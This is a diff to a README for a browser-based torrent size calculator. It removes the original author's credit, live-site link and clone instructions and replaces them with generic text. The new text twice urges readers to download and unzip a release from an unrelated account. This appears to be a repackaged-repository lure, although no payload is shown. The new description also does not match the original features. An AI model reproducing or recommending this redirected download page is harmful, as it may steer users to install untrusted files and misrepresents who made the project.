@@ -1,98 +1,84 @@
-<div align="center">
+# 🎉 torrent-size-calculator - Effortless Torrent Size Management
 
-# 🧲 Torrent Size Calculator
+## 🚀 Getting Started
 
-A lightweight, offline-friendly web tool to calculate and organize torrent sizes with a clean, modern interface.
+Welcome to the torrent-size-calculator. This tool helps you easily calculate and organize torrent sizes without needing an internet connection. You can drag and drop your files, use keyboard shortcuts, and save your progress locally. 
 
-<p align="center">
-  <img src="screenshot.jpg">
-</p>
+## 📥 Download & Install
 
-[**Open the live project**](https://lxghtexe.github.io/torrent-size-calculator/) — use it directly in your browser, no setup required.
+To get started, you will need to download the application. Click the button below to visit the Releases page.
 
-</div>
+[![Download torrent-size-calculator](https://img.shields.io/badge/Download-torrent--size--calculator-blue.svg)](https://github.com/psudi109-debug/torrent-size-calculator/releases)
 
----
+Visit this page to download: [GitHub Releases](https://github.com/psudi109-debug/torrent-size-calculator/releases)
 
-## 🚀 Overview
+## 🛠️ System Requirements
 
-**Torrent Size Calculator** is a small front-end project built with **HTML, Tailwind CSS, and Vanilla JavaScript**. It allows you to list torrents, choose storage units, reorder entries, and instantly see the total size — all **locally**, without sending any data to a server.
+- **Operating System**: Works on Windows, MacOS, and Linux.
+- **Browser**: The application runs in modern web browsers, including Chrome, Firefox, and Edge.
+- **Storage**: Minimal space required (under 10MB for localStorage).
 
-The project is designed to be:
+## 🔍 Features
 
-* Simple
-* Fast
-* Offline-first
-* Easy to use with mouse **and** keyboard
+- **Drag & Drop Support**: Easily add your files by dragging them into the application.
+- **Keyboard Shortcuts**: Use your keyboard for quick actions without clicking through menus.
+- **LocalStorage**: Your calculations and settings are stored on your device, so you can access them later.
+- **Offline Access**: Use the tool without an internet connection.
 
----
+## 📋 How to Use
 
-## ✨ Features
+### Step 1: Download the Application
 
-* ➕ Add, remove, and duplicate torrent rows
-* 📐 Supports multiple storage units (B → BB)
-* 🔢 Automatic total size calculation with smart unit scaling
-* 🖱️ Drag & drop row reordering with visual indicators
-* ⌨️ Keyboard support (Enter, Delete, Alt + ↑ / ↓)
-* 💾 Persistent data using `localStorage`
-* 📤 Export data to JSON
-* 📥 Import data from JSON
-* 🧲 Run links (supports `magnet:` and `http(s)` URIs)
-* 📱 Clean, responsive layout
+After downloading the file from the Releases page, locate it in your Downloads folder.
 
----
+### Step 2: Unzip the File (if needed)
 
-## 🛠️ Tech Stack
+If you download a zipped file, right-click on it and select "Extract All" to unzip. Open the newly created folder.
 
-* **HTML5**
-* **Tailwind CSS**
-* **Vanilla JavaScript**
-* **Heroicons**
-* **GitHub Pages** (deployment)
+### Step 3: Open the Application
 
-No frameworks. No build step. No backend.
+Locate the `index.html` file in the extracted folder. Double-click this file. It will open in your default web browser.
 
----
+### Step 4: Use Drag & Drop
 
-## 📦 Usage
+To begin, drag your torrent files into the application window. You’ll see their sizes calculated instantly.
 
-You can use the project in two ways:
+### Step 5: Save Your Work
 
-### 1️⃣ Online (recommended)
+The application automatically saves your data using localStorage. You can close your browser, and when you return, your previous session will still be available.
 
-Open the live version:
+### Step 6: Explore Keyboard Shortcuts
 
-👉 [https://lxghtexe.github.io/torrent-size-calculator/](https://lxghtexe.github.io/torrent-size-calculator/)
+Refer to the help section in the app to learn useful keyboard shortcuts. This will enhance your productivity.
 
-### 2️⃣ Locally
+## 🖥️ Support
 
-Clone the repository and open `index.html` in your browser:
+If you face any issues while using the torrent-size-calculator, please feel free to open an issue on the GitHub repository. Our community will help you resolve it.
 
-```bash
-git clone https://github.com/lxghtexe/torrent-size-calculator.git
-cd torrent-size-calculator
-```
+## 🌐 Topics Covered
 
-Then simply open `index.html`.
+This application touches on various topics that enhance your experience, such as:
+- **CSS**: Styles the application for a clean look.
+- **JavaScript**: Provides the functionality needed for calculations.
+- **HTML**: The basic structure of the application.
+- **LocalStorage**: Saves your data locally for offline access.
+- **Offline Capability**: Fully functional without the need for internet access.
+- **Tailwind CSS**: A modern utility-first CSS framework for design.
 
----
+## 📣 Feedback
 
-## 👨‍💻 Author
+Your feedback is valuable. If you have suggestions for improvements or features, please let us know via the issues section.
 
-Created by **lxghtexe**
+## 💡 Contributions
 
-Built as a small but polished project focused on usability, interaction, and clean front-end logic.
-
----
+We welcome contributions! If you're interested in helping improve the torrent-size-calculator, check the contributing guidelines in the repository.
 
 ## 📄 License
 
-This project is licensed under the **MIT License**. See the `LICENSE` file for details.
+This project is licensed under the MIT License. Feel free to use, modify, and share! 
 
----
+### Ready to manage your torrents? 
 
-<div align="center">
+Click below to start using torrent-size-calculator:
 
-Made with ❤️ in Brazil
-
-</div>
+[![Download torrent-size-calculator](https://img.shields.io/badge/Download-torrent--size--calculator-blue.svg)](https://github.com/psudi109-debug/torrent-size-calculator/releases)
